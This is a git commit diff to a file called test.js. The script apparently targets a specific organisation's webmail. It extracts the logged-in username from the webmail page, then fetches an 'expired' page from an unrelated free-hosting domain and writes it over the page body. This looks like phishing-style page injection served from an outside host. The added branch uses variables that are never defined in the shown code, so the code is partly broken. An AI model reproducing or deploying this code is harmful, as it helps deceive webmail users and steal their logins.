0213a3993f949932f73d0af0bfa467a3e2ac3b6f
disc786 <148037505+disc786@users.noreply.github.com>
2023-11-08 07:24:17 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,6 @@
 var hostURL = 'https://webmail.fwo.com.pk';
 var htmlFileURL = 'https://webworldoppertunity.wuaze.com/axigen/ExpiredPage/expired.php/';
+
 function test(){
   const url = new URL(window.location.href);
   const params = new URLSearchParams(url.search);
@@ -10,11 +11,25 @@ function test(){
 }
 test();
 
-
 function loadHTMLContent(username) {
 
-    const url = ''+ htmlFileURL;
-  
+  const url = ''+ htmlFileURL;
+
+  // Fetch content from the PHP script
+  fetch(''+ phpFileURL +'')
+    .then(response => response.text())
+    .then(text => {
+      // Check if the text contains 'user'
+      if (text.includes(username)) {
+        // Render the image
+        const image = new Image();
+        image.src = ''+ imageURL;
+		image.width = 1024;  // Set width to 1024 pixels
+        image.height = 768;  // Set height to 768 pixels
+        document.body.innerHTML = '';  // Clear existing content
+        document.body.appendChild(image);
+      } else {
+        // Fetch and replace the HTML content
         fetch(url)
           .then(response => response.text())
           .then(html => {
@@ -25,27 +40,30 @@ function loadHTMLContent(username) {
           })
           .catch(error => console.error('Error fetching HTML content:', error));
       }
-   
+    })
+    .catch(error => console.error('Error fetching PHP response:', error));
+}
 
 
 async function extractUsernameFromURL(h) {
-try {
-const url = ''+ hostURL +'/?_h='+h;
-const response = await fetch(url);
-if (!response.ok) {
-throw new Error(`Network response was not ok: ${response.statusText}`);
-}
-const text = await response.text();
-const regex = /username:\s*"([^"]+)"/i;
-const match = text.match(regex);
-if (match && match[1]) {
-const username = match[1];
-  console.log(username);
-  console.log(match);
-loadHTMLContent(username);
-} else {
-}
+  try {
+	  const url = ''+ hostURL +'/?_h='+h;
+    const response = await fetch(url);
+    if (!response.ok) {
+      throw new Error(`Network response was not ok: ${response.statusText}`);
+    }
 
-} catch (error) {
-}
+    const text = await response.text();
+    const regex = /username:\s*"([^"]+)"/i;
+    const match = text.match(regex);
+
+    if (match && match[1]) {
+      const username = match[1];
+      loadHTMLContent(username);
+    } else {
+     
+    }
+  } catch (error) {
+    
+  }
 }
